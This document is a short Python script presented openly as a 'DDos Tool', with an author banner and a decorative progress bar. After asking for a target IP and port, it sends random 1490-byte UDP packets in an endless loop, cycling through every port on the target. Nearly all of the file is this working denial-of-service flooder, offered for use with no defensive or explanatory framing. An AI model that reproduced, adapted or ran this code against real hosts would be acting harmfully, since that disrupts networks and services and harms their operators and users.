#DDos Tool With Python
import sys
import os
import time
import socket
import random
from datetime import datetime

now = datetime.now()
minute = now.minute
hour = now.hour  
day = now.day
month = now.month
year = now.year

#socket creation 
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)  
os.system("clear")

#display banner
os.system("figlet DDos")
print()
print("Author :- MD. Abdul Hannan Mir")
print("Github :- hannan0x0")
print("Page   :- Cyberdemy Bangladesh")
print()

ip = input("Enter Your Target IP: ")
print()
port = int(input("Enter Port: "))

os.system("clear")
os.system("toilet Attacking")

#design
print("[###                 #]0%")
time.sleep(1)
print("[##                 #]5%")
time.sleep(2)
print("[#####                #]10%")
time.sleep(0.01)  
print("[#######                 #]20%")
time.sleep(1)
print("[########                 #]32%")
time.sleep(1)  
print("[############                 #]50%")
time.sleep(3)  
print("[################                 #]63%")
time.sleep(1)  
print("[###################                 #]80%")
time.sleep(1)
print("[#############################          #]99%")
time.sleep(4)  
print("[##########################################    #]100%")
time.sleep(1)

#looping
sent = 0  
while True:
    sock.sendto(bytes, (ip, port))
    sent = sent + 1
    port = port + 1  
    print("sent %s packet to %s sent port:%s" % (sent, ip, port))
    if port == 65534:
        port = 1